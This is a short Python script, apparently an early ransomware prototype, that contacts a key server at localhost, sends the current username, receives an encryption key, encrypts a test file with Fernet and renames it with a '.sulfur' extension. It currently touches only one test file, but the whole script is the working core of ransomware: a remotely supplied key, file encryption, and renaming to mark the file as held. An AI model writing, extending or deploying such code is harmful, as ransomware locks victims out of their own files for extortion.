import os
import socket
import base64
from cryptography.fernet import Fernet

HOST = '127.0.0.1'
PORT = 12345

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((HOST, PORT))

user=os.environ.get('USER', os.environ.get('USERNAME'))

client_socket.sendall(user.encode())

dat=client_socket.recv(64).decode()

hash=bytes.fromhex(dat)
fernet = Fernet(base64.urlsafe_b64encode(hash))

test="sulfur/test.txt"
name=test.split(".")[0]

# Read and encrypt the file
with open(test, "rb") as file:
    original = file.read()

encrypted = fernet.encrypt(original)

newname=name+".sulfur"
os.rename(test,newname)

# Write the encrypted data
with open(newname, "wb") as encrypted_file:
    encrypted_file.write(encrypted)

print(os.getlogin())